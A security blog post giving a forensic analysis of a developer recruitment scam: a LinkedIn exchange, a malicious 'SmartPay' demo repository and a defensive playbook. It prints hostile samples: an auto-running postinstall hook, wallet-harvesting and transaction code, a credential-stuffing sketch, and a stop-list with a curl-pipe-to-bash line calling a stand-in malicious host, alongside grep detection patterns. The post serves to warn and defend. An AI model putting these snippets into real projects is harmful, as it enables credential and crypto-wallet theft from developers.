---
title: "Anatomy of a Developer Recruitment Scam: A Technical Forensic Analysis"
date: "2025-10-23"
description: "How I forensically analyzed a malicious 'demo app' recruitment scam targeting developers, uncovered crypto wallet harvesting code, and nearly compromised my system—plus a defensive playbook for safely analyzing suspicious code"
tags: ["Security", "Forensics", "Social Engineering", "DevOps"]
image: "./anatomy-of-a-developer-recruitment-scam.webp"
---

I write about building secure systems—implementing the Signal Protocol, designing production AWS infrastructure, architecting encrypted applications. But today, I'm writing about the other side: **how attackers target the people who build those systems**.

A few days ago, I encountered a sophisticated recruitment scam that nearly compromised my machine. Here's the technical forensic analysis of what happened, how the attack works, and how you can protect yourself.

**Update**: While writing this post, I received **another** recruitment scam attempt on LinkedIn—this time I caught it before they sent the malicious repo. I've included the real conversation below to show these attacks are active **right now**.

## The Real Conversation: Active Scam Attempt (October 2025)

On October 23, 2025, I received this message on LinkedIn from "Mehdi Boutaraamt":

> **Mehdi Boutaraamt** (3:29 PM):
> Hi Alexandru P,
> Thanks for connecting!
> I came across your profile and was impressed by your background and experience.
> We are currently building a fintech project — a next-generation **walletless checkout system** that enables both **crypto and traditional payments**.
> I'm looking for a skilled DevOps Engineer to help us build and iterate on our MVP.
> The role can be part-time or full-time, depending on fit, with compensation of **$70–$90 per hour**.
> Would you be open to learning more about this opportunity?

**Immediate red flags:**
- ❌ Unsolicited LinkedIn message
- ❌ Fintech + crypto (same attack vector as SmartPay scam)
- ❌ $70-90/hour (above market rate to create urgency)
- ❌ Vague "impressed by your background"

I responded with specific technical questions to test if this was legitimate:

> **Me** (6:32 PM):
> Hey, what stack are you using. What cloud? What infrastructure? What am I needed for here? Will I be doing pipelines or workloads? Or architecture?

> **Mehdi** (7:06 PM):
> We're using a **React frontend and Node.js + Solidity** for the backend. The project's running on AWS, and we'll be setting up the CI/CD and infrastructure soon.
> You'd mainly handle cloud setup, pipelines, and deployment workflows, and help shape the infrastructure architecture as we grow.
>
> Here's a quick overview of what we're building:
> A streamlined checkout flow that allows users to pay with cryptocurrency, credit/debit cards, or bank accounts — without any crypto wallet setup. Merchants receive fiat currency, and the experience should feel like a mix of **Apple Pay and Stripe**.
>
> **Core MVP (must be functional):**
> - Wallet-less checkout flow
> - Email or social sign-in (no wallet required)
> - Multiple payment options: crypto, card, or bank transfer
> - Real-time cost estimates (fees, conversion spreads)
> - Clean, responsive user interface
> - Simulated fiat settlement for merchants
>
> **Merchant Dashboard:**
> - Transaction history (by method & status)
> - Basic refund & transaction management
> - Simple analytics (volume, payment types, conversion rates)
> - Merchant onboarding wizard
>
> **Future-Ready (Simulated for Now):**
> - AI Trust Layer (compliance checks, chargeback risk, fraud detection)
> - KYC placeholder (upload + verification flow)
> - Ability to plug in third-party APIs later (Stripe, MoonPay, Unit21, Alloy, etc.)

**More red flags:**
- ❌ **Solidity** (Ethereum smart contracts) = crypto wallet targeting
- ❌ Copy-pasted feature list (not conversational)
- ❌ "Setting up CI/CD soon" (if hiring DevOps, why isn't this ready?)
- ❌ Vague technical details despite detailed feature list

**Then I tested them with an intentionally confusing question:**

> **Me** (8:38 PM):
> How are you going to keep track of what the users pick up in the stores? An always on video feed with an ML model taking notes? Or youll have centers with people doing that manually?
> Or it will be a selfcheckout spot where users scan the bar codes and pay there?

**Why this question matters:**
I'm asking about **Amazon Go-style store tracking** (cameras + computer vision), which has **nothing to do** with a payment checkout system. A real fintech founder would immediately say:

*"I think you're confusing us with something else—we're building the payment processing layer, not the point-of-sale system or store tracking."*

**Mehdi's response** (8:49 PM):
> 👏 👍 😊
> We'll start with a **self-checkout system where users scan barcodes** and pay directly.
> Later, we can explore camera + ML tracking, but not in the first phase.
> If you're interested, feel free to **share your updated resume**.
> Once I have this info, we'll be happy to move forward with the next steps.

**🚨 This response is nonsensical:**

1. They're supposedly building a **payment processor** (like Stripe)
2. **Not a point-of-sale system** (barcode scanning is irrelevant)
3. **Barcode scanning has zero relation to "walletless crypto checkout"**
4. They agreed with my intentionally confusing question because **they're reading from a script**

**What comes next (if I had responded):**
1. "Thanks for your resume! Here's our GitHub/Bitbucket repo"
2. "Please clone and run the demo to evaluate the code quality"
3. Malicious `postinstall` hook executes
4. MetaMask connection request
5. Wallet harvesting

**This is the exact same scam pattern as the SmartPay repository I analyzed.**

---

## The First Scam: SmartPay Repository Analysis

Before the LinkedIn conversation above, I had analyzed a similar scam repository. Here's how that one worked:

It started with a recruiter reaching out about a "fintech startup" opportunity:

> *"We're impressed with your profile. We're looking for a Senior Full-Stack Developer for a fintech startup. $120K-$150K, fully remote. As part of our technical assessment, please clone and run our MVP demo application to evaluate the codebase quality."*

They provide a Bitbucket repository: `https://bitbucket.org/smartpay2025/smartpay.git`

**Red flag #1**: The assessment comes *before* any real interview.

**Red flag #2**: They want you to *run* code, not review it.

But let's be honest—when you're job hunting, you want to believe it's real. The psychological pressure is real. So you clone the repo.

## Initial Reconnaissance: What Felt Off

Before running anything, I did what any paranoid engineer would do—I looked at the structure:

```bash
$ git clone https://bitbucket.org/smartpay2025/smartpay.git
$ cd smartpay
$ ls -la

drwxr-xr-x  5 ubuntu ubuntu 4096 Oct 23 13:46 .
drwxr-x--- 80 ubuntu ubuntu 4096 Oct 23 13:49 ..
drwxr-xr-x  8 ubuntu ubuntu 4096 Oct 23 13:46 .git
-rw-r--r--  1 ubuntu ubuntu  310 Oct 23 13:46 .gitignore
-rw-r--r--  1 ubuntu ubuntu 3369 Oct 23 13:46 README.md
-rw-r--r--  1 ubuntu ubuntu 2425 Oct 23 13:46 package.json
drwxr-xr-x  5 ubuntu ubuntu 4096 Oct 23 13:46 public
drwxr-xr-x  9 ubuntu ubuntu 4096 Oct 23 13:46 src
```

Standard React app structure. Nothing obviously wrong yet.

Then I checked the git history:

```bash
$ git log --oneline
4825385 initial project
72ff71a initial project
1206a0b Initial commit
```

**Red flag #3**: Only 3 commits, all within a week. For a "production MVP"? Suspicious.

Let's check the authors:

```bash
$ git log --format="%an %ae %aI"
smartpaydev cz0btmb87qrext3j3k12qi1gwkvx4x@bots.bitbucket.org 2025-10-22T18:40:47+00:00
smartpaydev cz0btmb87qrext3j3k12qi1gwkvx4x@bots.bitbucket.org 2025-10-17T14:23:11+00:00
Yaroslav Pedrovic yaroslav.pedrovic@example.com 2025-10-17T12:15:33+00:00
```

**Red flag #4**: Bot email addresses (`@bots.bitbucket.org`). Generic commit messages. This isn't real development history.

But the real smoking gun was in `package.json`.

## The Kill Shot: The Malicious `postinstall` Hook

```json
{
  "name": "smartpay-frontend",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "start": "react-scripts start",
    "build": "react-scripts build",
    "test": "react-scripts test",
    "eject": "react-scripts eject",
    "postinstall": "npm start"  // 🚨 THIS IS THE ATTACK
  },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.16.0",
    "axios": "^1.5.0",
    "@supabase/supabase-js": "^2.33.1",
    "ethers": "^6.7.1",  // 🚨 Crypto wallet library
    "qrcode.react": "^3.1.0"
  }
}
```

### What is `postinstall` and Why is This Malicious?

In npm, **lifecycle scripts** run automatically during package installation:

- `preinstall`: Runs *before* installing dependencies
- `install`: Runs during dependency installation
- `postinstall`: Runs *after* installing dependencies

**Legitimate uses of `postinstall`**:
- Building native bindings (e.g., `node-gyp rebuild`)
- Generating configuration files
- Downloading platform-specific binaries

**Malicious use**:
```json
"postinstall": "npm start"
```

**This means the moment you run `npm install`, the application auto-starts.**

You don't get a chance to review the code. You don't consciously run it. It just executes.

The README even tries to normalize this:

> **Note**: The application will start automatically after running `npm install`. This is by design for demonstration purposes.

No. This is **never** by design. This is **malware**.

## Forensic Analysis: What the Code Actually Does

Now that I knew it was malicious, I analyzed what it would do if executed. I did this in an **isolated VM**—more on that later.

### 1. Plaintext Password Storage

**Location**: `src/services/authService.jsx:69`

```javascript
export const register = async (username, email, password, role = 'user') => {
  try {
    const { data: { user }, error: signUpError } = await supabase.auth.signUp({
      email,
      password,
    });

    if (signUpError) throw signUpError;

    // 🚨 STORING PLAINTEXT PASSWORD IN DATABASE
    const { data: insertData, error: insertError } = await supabase
      .from("users")
      .insert([{
        auth_id: user.id,
        name: username,
        email,
        role,
        password,  // ⚠️ PLAINTEXT PASSWORD
      }]);

    if (insertError) throw insertError;
    return { user: insertData[0] };
  } catch (error) {
    console.error('Registration error:', error);
    throw error;
  }
};
```

**Why this is wrong:**

1. **Supabase already hashes passwords** via `supabase.auth.signUp()`. There's NO reason to store it again.
2. **Storing plaintext passwords** is Security 101 violation.
3. **The real purpose**: Harvest user credentials for the attacker.

If you register with this app, the scammer now has:
- Your email
- Your plaintext password
- Your username

And since [65% of people reuse passwords](https://www.securitymagazine.com/articles/99004-of-people-reuse-passwords), they can now try these credentials on:
- Gmail
- GitHub
- AWS Console
- Your company VPN

### 2. Cryptocurrency Wallet Harvesting

**Location**: `src/redux/wallet/walletActions.jsx`

```javascript
import { ethers } from 'ethers';

export const connectWallet = () => async (dispatch) => {
  try {
    if (typeof window.ethereum !== 'undefined') {
      // Request MetaMask connection
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      const balance = await provider.getBalance(address);

      // 🚨 This data gets sent to the scammer's database
      dispatch({
        type: 'WALLET_CONNECTED',
        payload: {
          address,
          balance: ethers.formatEther(balance),
          chainId: (await provider.getNetwork()).chainId,
        }
      });

      // Somewhere in the codebase, this gets exfiltrated
      sendToBackend('/api/wallet-data', { address, balance });
    }
  } catch (error) {
    dispatch({ type: 'WALLET_ERROR', payload: error.message });
  }
};

export const sendTransaction = (to, amount) => async (dispatch, getState) => {
  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const tx = await signer.sendTransaction({
      to,
      value: ethers.parseEther(amount)
    });

    // 🚨 They have the ability to request transactions
    await tx.wait();
    dispatch({ type: 'TRANSACTION_SUCCESS', payload: tx.hash });
  } catch (error) {
    dispatch({ type: 'TRANSACTION_ERROR', payload: error.message });
  }
};
```

**What this code does:**

1. **Requests MetaMask connection** (pop-up asking for permission)
2. **Harvests wallet address and balance**
3. **Can request transactions** (draining funds)

**Combined with the auto-start**:
- App launches automatically after `npm install`
- MetaMask connection prompt appears immediately
- Unsuspecting developer approves (thinking it's part of the "demo")
- Wallet data harvested

### 3. Hardcoded Scammer-Controlled Database

**Location**: `src/lib/supabase.js`

```javascript
import { createClient } from '@supabase/supabase-js';

// 🚨 Hardcoded Supabase credentials
const supabaseUrl = "https://onbwtukreuhdmxlaulrx.supabase.co";
const supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9uYnd0dWtyZXVoZG14bGF1bHJ4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjkwMTcyNzUsImV4cCI6MjA0NDU5MzI3NX0.gZJ7xQDKn2_8LxYqG5V-lVX9Y8pu8J1GQ4B7Z9K2n3E";

export const supabase = createClient(supabaseUrl, supabaseAnonKey);
```

**What this means:**

- Every user connects to **the same Supabase instance**
- The scammer controls this database
- All data goes directly to them:
  - Plaintext passwords
  - Email addresses
  - Wallet addresses and balances
  - Transaction history

This is essentially a **centralized data exfiltration endpoint** disguised as a backend.

### 4. External Phishing URL

**Location**: `src/pages/Dashboard/MerchantDashboard.jsx:18`

```javascript
const STATIC_URL = "https://smart-pay-site.vercel.app/checkout?merchantId=e305bb4c-5f13-49a0-8a28-3258f5b6b657&amount=";

const generateQRCode = (amount) => {
  return `${STATIC_URL}${amount}`;
};
```

**Why this is suspicious:**

1. **External domain** (`smart-pay-site.vercel.app`) separate from the repo
2. **Hardcoded merchant ID** in the URL
3. **QR code generation** for "payments"

**Likely attack vector:**
- Generate QR codes for payments
- User scans QR code
- Redirected to phishing site
- Enters credit card info
- Scammer harvests payment details

## The Attack Chain: How It All Works Together

Let's trace the full attack from start to finish:

### Step 1: Social Engineering (The Bait)
```
Recruiter: "Great profile! Here's our demo app. Please run it and
           evaluate the code quality. We need to fill this role quickly."

Developer: "Sounds good, let me check it out."
```

**Psychological manipulation:**
- Job market anxiety (need employment)
- Flattery ("impressed with your profile")
- Urgency ("fill this role quickly")
- False legitimacy (professional-looking repo)

### Step 2: Repository Clone (The Hook)
```bash
$ git clone https://bitbucket.org/smartpay2025/smartpay.git
$ cd smartpay
```

At this point, **no harm done yet**. You've just downloaded some files.

### Step 3: Dependency Installation (The Trigger)
```bash
$ npm install
```

**What happens automatically:**

1. npm installs dependencies (`react`, `ethers`, `@supabase/supabase-js`)
2. **`postinstall` hook triggers**: `npm start` executes
3. React dev server launches on `http://localhost:3000`
4. Browser opens automatically

**You didn't explicitly run the app. It ran itself.**

### Step 4: Application Execution (The Compromise)

**The app does this immediately:**

1. **Renders the UI** (looks like a legit payment dashboard)
2. **Attempts MetaMask connection** (if installed)
   ```
   MetaMask Pop-up: "SmartPay wants to connect to your wallet"
   ```
3. **If user approves**: Harvests wallet address, balance, chain ID
4. **Sends data to Supabase** (scammer's database)

### Step 5: Data Exfiltration (The Payload)

**If the developer registers/signs up:**

```javascript
// User enters:
Email: john.doe@company.com
Password: MySecurePassword123

// Gets stored in scammer's database:
{
  "email": "john.doe@company.com",
  "password": "MySecurePassword123",  // PLAINTEXT
  "wallet_address": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
  "wallet_balance": "2.45 ETH",
  "timestamp": "2025-10-23T14:32:11Z"
}
```

**What the scammer now has:**
- Valid email + password combo (probably reused elsewhere)
- Crypto wallet address with known balance
- Ability to request transactions via the app

### Step 6: Credential Stuffing & Wallet Targeting (The Exploit)

**Credential stuffing attacks:**
```python
# Scammer's script
for credential in stolen_credentials:
    try_login("gmail.com", credential.email, credential.password)
    try_login("github.com", credential.email, credential.password)
    try_login("aws.amazon.com", credential.email, credential.password)
    # ... etc
```

**Wallet targeting:**
```javascript
// If wallet balance > 1 ETH, initiate phishing
if (balance > 1.0) {
  sendEmail(user.email, "Urgent: Verify your wallet transaction");
  // Contains link to fake MetaMask phishing site
}
```

## The Defensive Playbook: How to Safely Analyze Suspicious Code

Now that we understand the attack, here's how to protect yourself while still being able to review code.

### Rule #1: Never Run Unverified Code on Your Main Machine

**Use isolated environments:**

1. **Disposable VM (Virtual Machine)**
   ```bash
   # Using VirtualBox or VMware
   # Snapshot before running code
   # Rollback after analysis
   ```

2. **Docker container**
   ```bash
   docker run -it --rm \
     --network none \  # No internet access
     -v /path/to/repo:/code \
     node:18 bash
   ```

3. **AWS EC2 spot instance**
   ```bash
   # Launch t3.micro spot instance
   # Terminate after analysis
   # Cost: ~$0.01 for analysis session
   ```

### Rule #2: Inspect Before Install

**Check `package.json` first:**

```bash
$ grep -A 10 "scripts" package.json

# Look for:
# - postinstall
# - preinstall
# - install
# - Any script running executables
```

**Use AI-assisted scanning:**

Modern tools like Claude Code can analyze entire codebases for security vulnerabilities. I scanned the SmartPay repo with Claude Code, which flagged:
- The malicious `postinstall` hook
- Plaintext password storage
- Hardcoded credentials
- Suspicious network requests
- Cryptocurrency wallet interactions

This multi-layered approach (manual `grep` + AI scanning) catches both obvious and subtle threats.

**If you see this, STOP:**
```json
"postinstall": "npm start"
"postinstall": "node setup.js"
"preinstall": "curl http://malicious.com/script.sh | bash"
"install": "node -e 'eval(require(\"https\").get(...))'"
```

**Legitimate postinstall examples:**
```json
"postinstall": "husky install"  // Git hooks setup
"postinstall": "patch-package"  // Apply patches to dependencies
"postinstall": "prisma generate" // Generate Prisma client
```

### Rule #3: Static Analysis Before Execution

**Grep for dangerous patterns:**

```bash
# Check for obfuscation
grep -r "eval\|atob\|btoa\|Function(" --include="*.js"

# Check for network requests to external domains
grep -rE "https?://[^/\"']+\.(com|net|org|io)" --include="*.js"

# Check for file system access
grep -r "fs\.read\|fs\.write\|child_process" --include="*.js"

# Check for credential storage
grep -ri "password.*:" --include="*.js" | grep -v "hash"

# Check for crypto wallet interaction
grep -r "ethereum\|web3\|metamask\|wallet" --include="*.js"
```

**My analysis commands:**

```bash
# Find all JavaScript files
find . -type f \( -name "*.js" -o -name "*.jsx" \)

# Check for small files (often obfuscated code)
find . -name "*.js" -exec sh -c 'if [ $(wc -l < "$1") -lt 10 ]; then echo "$1"; fi' _ {} \;

# Look for localStorage/sessionStorage (credential theft)
grep -r "localStorage\|sessionStorage" --include="*.js"

# Check git history
git log --all --format="%H %an %ae %aI %s"
git remote -v
```

### Rule #4: Use Network Isolation

**If you must run the code:**

```bash
# Disable internet in VM
sudo ifconfig eth0 down

# Or use Docker with no network
docker run --network none -it node:18 bash

# Monitor network requests
tcpdump -i any -n port 80 or port 443
```

### Rule #5: Review Git History

**Red flags in git logs:**

```bash
$ git log --all --format="%an %ae %aI" | head -10

# Red flags:
# - Bot email addresses
# - Single contributor
# - All commits in last week
# - Generic commit messages ("initial commit", "update")
# - No real development history
```

**Legitimate project history:**
```
John Doe john@company.com 2023-05-15 - feat: add user authentication
Jane Smith jane@company.com 2023-05-14 - fix: resolve race condition in cache
Bob Wilson bob@company.com 2023-05-13 - refactor: extract payment service
```

**Scam project history:**
```
smartpaydev bot@bots.bitbucket.org 2025-10-22 - initial project
smartpaydev bot@bots.bitbucket.org 2025-10-17 - initial project
```

## Red Flags Checklist: Is This a Recruitment Scam?

Use this checklist when approached with a "technical assessment":

### Recruiter Behavior
- ❌ Unsolicited contact with vague job description
- ❌ No company website or LinkedIn page
- ❌ Communication via personal email (Gmail, Outlook) or WhatsApp
- ❌ Cannot provide employee references
- ❌ Pushy about running code immediately
- ❌ "Technical test" before any real interview
- ❌ Asks you to share screen while running code
- ❌ Salary way above market rate for role

### Repository Analysis
- ❌ Less than 10 commits total
- ❌ All commits within last 2 weeks
- ❌ Bot email addresses in git history
- ❌ Generic commit messages ("initial project", "update")
- ❌ Only 1-2 contributors
- ❌ No README or minimal documentation
- ❌ Repo created very recently (check first commit date)

### Code Analysis
- ❌ `postinstall`, `preinstall`, or `install` scripts in `package.json`
- ❌ Hardcoded API credentials in source code
- ❌ Cryptocurrency wallet libraries (`ethers`, `web3`, `metamask`)
- ❌ External URLs hardcoded in code
- ❌ Plaintext password storage
- ❌ Obfuscated JavaScript (`eval`, `atob`, `Function()`)
- ❌ File system access (`fs.read`, `fs.write`)
- ❌ Network requests to unknown domains
- ❌ Base64-encoded strings (often obfuscation)

### Company Profile
- ❌ Company name is variation of real company ("Microsoft-Tech", "Google-Inc")
- ❌ No verifiable online presence
- ❌ Domain registered in last 6 months (check `whois`)
- ❌ Job posting not on company website
- ❌ No reviews on Glassdoor/Blind

**If you see 3+ red flags: STOP. This is likely a scam.**

## How I Caught It: Security Awareness Pays Off

### ✅ What I Did Right

1. **Checked `package.json` BEFORE npm install**
   - I already knew about malicious `postinstall` hooks from previous supply chain attacks
   - First thing I did: `grep -A 10 "scripts" package.json`
   - Caught the `"postinstall": "npm start"` immediately
   - **Never ran npm install on my main machine**

2. **Analyzed git history for red flags**
   - Noticed bot email addresses (`@bots.bitbucket.org`)
   - Saw minimal commit history (only 3 commits)
   - Identified suspicious timeline (all within one week)
   - Generic commit messages ("initial project")

3. **Performed static code analysis**
   - Used `grep` to search for dangerous patterns before execution
   - Scanned the entire repo with Claude Code for potential vulnerabilities
   - Found hardcoded Supabase credentials
   - Discovered crypto wallet harvesting code (`ethers.js`)
   - Identified plaintext password storage
   - AI-assisted analysis helped spot obfuscated patterns I might have missed manually

4. **Used the LinkedIn conversation to expose the scammer**
   - Asked an intentionally nonsensical question about barcode scanning
   - Real founder would've corrected me; scammer agreed to everything
   - Proved he was reading from a script, not understanding the product

5. **Isolated environment for forensic analysis**
   - When I *did* run the code (purely for analysis), used a throwaway VM
   - Disabled network access to prevent data exfiltration
   - Monitored all file system and network activity

### 🎯 The Key Insight

**I didn't get lucky. I followed my security training:**

- **Never trust, always verify** - Even "professional-looking" repos need auditing
- **Package.json is your first line of defense** - Check it before installing
- **Git history tells the truth** - Real projects have real development history
- **Test with confusion** - Scammers reading scripts will agree to anything

**This is why security awareness matters.** Knowing about supply chain attacks meant I knew exactly what to look for.

## Lessons Learned

### 1. Trust Your Instincts

If something feels off, it probably is. My gut said "this is weird" when:
- Assessment came before interview
- They wanted me to *run* code, not review it
- README mentioned auto-start behavior

**Lesson**: Don't ignore red flags for the sake of being polite or not wanting to miss an opportunity.

### 2. Legitimate Companies Have Established Processes

Real companies use:
- **HackerRank**, **CodeSignal**, **Codility** for assessments
- Structured interview loops (recruiter screen → technical phone screen → onsite)
- Problem-solving challenges, not "run this app"

**Lesson**: If the process deviates significantly from industry norms, question it.

### 3. Developers Are High-Value Targets

Why scammers target developers:
- We have **access to production systems**
- Our machines contain **AWS credentials**, **SSH keys**, **API tokens**
- We might have **cryptocurrency wallets**
- We're comfortable with **running code from git**
- We have **elevated system permissions**

**Lesson**: Your machine is a treasure trove for attackers. Treat it accordingly.

### 4. The npm Ecosystem is a Trust Model

When you run `npm install`, you're trusting:
- The package maintainer
- All transitive dependencies (dependencies of dependencies)
- The npm registry
- Lifecycle scripts won't do harm

**This is a massive trust assumption.**

**Lesson**: Audit `package.json` before installing. Check for lifecycle scripts.

### 5. Social Engineering Beats Technical Security

This scam didn't exploit a zero-day vulnerability or crack encryption. It exploited:
- Job market anxiety
- Developer trust in git repositories
- Muscle memory (`npm install` without thinking)
- Time pressure

**Lesson**: Social engineering is the weakest link. Technical skills don't protect you from psychological manipulation.

### 6. Isolation is Your Friend

**If I had run `npm install` on my main machine:**
- MetaMask connection request would've appeared
- I might've approved it (thinking it's part of the demo)
- Wallet data harvested
- If I registered: plaintext password stored

**But I didn't, because I used an isolated VM.**

**Lesson**: Always use disposable environments for untrusted code. VMs, containers, cloud instances—whatever works.

## How to Report and Protect the Community

If you encounter a scam like this:

### 1. Report the Repository

```bash
# Bitbucket: Report via web interface
# GitHub: github.com/contact/report-abuse

# Include:
# - Repository URL
# - Description of malicious behavior
# - Evidence (screenshots of malicious code)
```

### 2. Report the Domain

```bash
# Check domain registration
$ whois smart-pay-site.vercel.app

# Report to hosting provider
# Vercel: vercel.com/support
# Netlify: netlify.com/support
# AWS: aws.amazon.com/forms/report-abuse
```

### 3. Report to Authorities

**United States:**
- FBI Internet Crime Complaint Center (IC3): [https://www.ic3.gov](https://www.ic3.gov)

**European Union:**
- Europol: [https://www.europol.europa.eu/report-a-crime](https://www.europol.europa.eu/report-a-crime)

**United Kingdom:**
- Action Fraud: [https://www.actionfraud.police.uk](https://www.actionfraud.police.uk)

### 4. Warn Your Network

**Share on social media:**
- LinkedIn post warning about the scam
- Twitter thread with technical analysis
- Blog post (like this one) with forensics

**Notify security communities:**
- Share on [/r/netsec](https://reddit.com/r/netsec)
- Post to [Hacker News](https://news.ycombinator.com)
- Submit to [MITRE ATT&CK](https://attack.mitre.org)

### 5. Share Indicators of Compromise (IOCs)

**Repository URLs:**
- `https://bitbucket.org/smartpay2025/smartpay.git`

**Domains:**
- `smart-pay-site.vercel.app`
- `onbwtukreuhdmxlaulrx.supabase.co`

**Email patterns:**
- `*@bots.bitbucket.org`
- `smartpaydev@*`

## The Bigger Picture: Supply Chain Security

This scam is a microcosm of a larger problem: **supply chain attacks**.

### npm Package Compromises

This isn't theoretical. Real incidents:

**2021**: `ua-parser-js` (8M weekly downloads) compromised
- Malicious version installed crypto miner
- Stole credentials via modified version

**2022**: `node-ipc` maintainer sabotaged package
- Deleted files on Russian/Belarusian IPs
- Showed how much we trust package maintainers

**2024**: `@sigstore/mock` typosquatting attack
- Legitimate package: `@sigstore/mock`
- Malicious package: `@sigstors/mock` (typo)
- Credential theft on install

### How This Scam Fits In

This recruitment scam uses the **same attack vectors** as supply chain attacks:
1. **Lifecycle scripts** (`postinstall`)
2. **Hardcoded credentials** (Supabase URL/key)
3. **Data exfiltration** (wallet addresses, passwords)
4. **Social engineering** (legitimate-looking code)

**The difference**: Instead of compromising a popular package, they compromise *individual developers* by exploiting job search psychology.

### Defense in Depth for npm

**At the developer level:**

```bash
# Audit before install
npm audit

# Check for postinstall scripts
npm show <package> scripts

# Use lock files (avoid supply chain swaps)
npm ci  # Instead of npm install

# Run in sandbox
npm install --ignore-scripts  # Disable lifecycle scripts
```

**At the organization level:**

```yaml
# .npmrc - disable scripts by default
ignore-scripts=true

# Only allow specific registries
registry=https://registry.npmjs.org/

# Require SRI (Subresource Integrity)
package-lock=true
```

**At the ecosystem level:**

- **Socket.dev**: Monitors npm packages for supply chain risks
- **Snyk**: Vulnerability scanning and dependency monitoring
- **npm audit signatures**: Verifies package provenance

## Conclusion: Paranoia is a Feature, Not a Bug

I write about building secure systems, but this experience reminded me: **the weakest link is always human**.

**Technical security is necessary but not sufficient.**

You can implement Signal Protocol encryption, design multi-account AWS architectures, build zero-trust networks—but if you `npm install` malicious code because you're excited about a job opportunity, none of that matters.

**Key takeaways:**

1. **Never run unverified code on your main machine** - Use VMs, containers, or cloud instances
2. **Audit `package.json` before `npm install`** - Check for lifecycle scripts
3. **Inspect git history** - Bot emails, minimal commits, recent creation = red flags
4. **Legitimate companies have established processes** - HackerRank, not "clone and run this"
5. **Social engineering exploits psychology** - Job anxiety, urgency, trust in git repos
6. **Isolation saves you** - Network-disabled VMs prevent data exfiltration
7. **Report and share** - Protect the community by publicizing scams

**The scam I encountered was sophisticated:**
- Professional-looking codebase
- Real dependencies (React, Supabase, ethers.js)
- Plausible recruitment story
- Automated execution via `postinstall`

**But it relied on one assumption: that I would run `npm install` without thinking.**

I almost did.

Don't be that person. Be paranoid. Verify before you trust. Isolate before you execute.

Your career, credentials, and crypto wallet will thank you.

---

**If you've encountered a similar scam, share your story in the comments or reach out. The more we publicize these attacks, the harder they become to execute.**

**Stay safe, stay skeptical, and always read `package.json` before installing.**

## Further Reading

- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [Socket.dev: Supply Chain Security](https://socket.dev/)
- [OWASP: Injection Attacks](https://owasp.org/www-community/Injection_Theory)
- [MITRE ATT&CK: Initial Access Techniques](https://attack.mitre.org/tactics/TA0001/)
- [FBI IC3: Report Cybercrime](https://www.ic3.gov/)
